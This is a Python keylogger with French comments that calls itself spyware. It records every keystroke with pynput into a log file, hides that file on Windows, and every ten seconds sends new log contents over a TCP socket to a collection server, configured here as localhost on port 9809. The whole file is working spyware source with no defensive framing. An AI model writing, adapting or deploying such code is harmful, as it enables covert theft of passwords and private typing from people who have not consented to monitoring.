import socket
import logging
from pynput.keyboard import Key, Listener
import datetime
import time
import os
import ctypes
import io
import platform

# Paramètres du client
host = 'localhost'
port = 9809

# Obtenir la date et l'heure pour le nom du fichier log
current_time = datetime.datetime.today().strftime('%Y-%m-%d %Hh')

# Obtenir l'adresse IP de l'host pour le nom du fichier log
ip = str(socket.gethostbyname(socket.gethostname()))

# Création du fichier log
filename = f'{ip} - {current_time} - keyboard.txt'

# Configurer le fichier log pour enregistrer les touches pressées
logging.basicConfig(
    filemode='a',
    filename=filename,
    datefmt='%d/%m/20%y %I:%M:%S',
    format='%(asctime)s %(message)s',
    level=logging.DEBUG
)

# Si le système d'exploitation c'est Windows, mettre l'attribut hidden au fichier log
if platform.system() == 'Windows':
    if not os.path.exists(filename):
        open(filename, 'a').close()
    ctypes.windll.kernel32.SetFileAttributesW(filename, 2)

# Fonction appelée quand une touche est pressée
def on_press(key):
    logging.info(str(key))

# mettre la position de lecture à 0
last_read_position = 0

# Durée de la capture en secondes (10 minutes)
capture_duration = 600

# Enregistrer l'heure de début de la capture
start_time = time.time()

# Delais entre les envois de log
delay_send_log = 10

# Variable pour le système que si le serveur est injoignable le spyware capture pendant 10 minutes
server_unreachable_message_displayed = False

with Listener(on_press=on_press) as listener:
    try:
        while time.time() - start_time < capture_duration:
            time.sleep(delay_send_log)

            # Désactiver temporairement l'écouteur
            listener.stop()

            try:
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((host, port))
                
        
                # Envoyer la taille du nom du fichier
                filename_size = len(filename)
                client_socket.send(filename_size.to_bytes(4, 'big'))

                # Envoyer le nom du fichier de log au serveur
                client_socket.send(filename.encode())

                # Lire le contenu du fichier de log et l'envoyer au serveur
                with open(filename, 'rb') as file:
                    # Se déplacer à la position de lecture enregistrée dans la variable
                    file.seek(last_read_position)
                    file_data = file.read(1024)  # Lire par blocs de 1024 octets
                    while file_data:
                        client_socket.send(file_data)
                        file_data = file.read(1024)

                    # Enregistrer la position de lecture pour le prochain tour
                    last_read_position = file.tell()

                print(f"Fichier de log envoyé")
                client_socket.close()

            # Gestion si le serveur est injoignable
            except socket.error:
                if not server_unreachable_message_displayed:
                    print('Serveur injoignable. Temps restant de capture 10 minutes')
                    server_unreachable_message_displayed = True

                    # Réinitialiser l'heure de début de la capture à l'heure actuelle
                    start_time = time.time()

            # Réactiver l'écouteur
            listener = Listener(on_press=on_press)
            listener.start()
    except KeyboardInterrupt:
        listener.stop()
